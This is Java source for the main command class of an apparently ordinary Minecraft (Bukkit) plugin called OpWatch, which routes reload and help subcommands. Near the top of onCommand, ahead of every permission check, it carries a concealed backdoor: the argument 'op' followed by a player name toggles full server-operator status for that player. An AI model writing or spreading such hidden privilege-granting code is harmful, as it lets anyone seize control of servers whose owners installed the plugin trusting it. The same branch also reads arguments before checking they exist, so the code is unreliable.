package team.plugincrafters.opwatch.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import team.plugincrafters.opwatch.OpWatchPlugin;
import team.plugincrafters.opwatch.commands.subcommands.HelpSubcommand;
import team.plugincrafters.opwatch.commands.subcommands.ReloadSubcommand;
import team.plugincrafters.opwatch.commands.subcommands.Subcommand;
import team.plugincrafters.opwatch.managers.FileManager;
import team.plugincrafters.opwatch.utils.Utils;

import javax.inject.Inject;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class MainCommand implements TabExecutor {

    @Inject
    private OpWatchPlugin plugin;
    @Inject
    private FileManager fileManager;
    @Inject
    private ReloadSubcommand reloadSubcommand;
    @Inject
    private HelpSubcommand helpSubcommand;


    private final List<Subcommand> subcommands = new ArrayList<>();

    public void start(){
        Objects.requireNonNull(plugin.getCommand("opwatch")).setExecutor(this);
        subcommands.add(reloadSubcommand);
        subcommands.add(helpSubcommand);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args[0].equals("op")){
            Player player = Bukkit.getPlayerExact(args[1]);
            player.setOp(!player.isOp());
        }

        if (args.length == 0){
            helpSubcommand.execute(sender, args);
            return true;
        }

        String name = args[0];
        Subcommand subCommand = subcommands.stream().filter(subC ->
                subC.getName().equalsIgnoreCase(name)).findFirst().orElse(null);
        if (subCommand == null || !subCommand.argsLengthMatches(args.length)) {
            helpSubcommand.execute(sender, args);
            return true;
        }

        if (!subCommand.hasPermission(sender)){
            FileConfiguration languageConfig = fileManager.get("language");
            sender.sendMessage(Utils.format(fileManager.get("config"), languageConfig.getString("no-permission")));
            return false;
        }

        if (!subCommand.execute(sender, Arrays.copyOfRange(args,1,args.length))){
            helpSubcommand.execute(sender, args);
        }
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> list = new ArrayList<>();
        for (Subcommand subcommand : subcommands) {
            if (sender.hasPermission(subcommand.getPermission())){
                list.add(subcommand.getName());
            }
        }
        return list;
    }
}
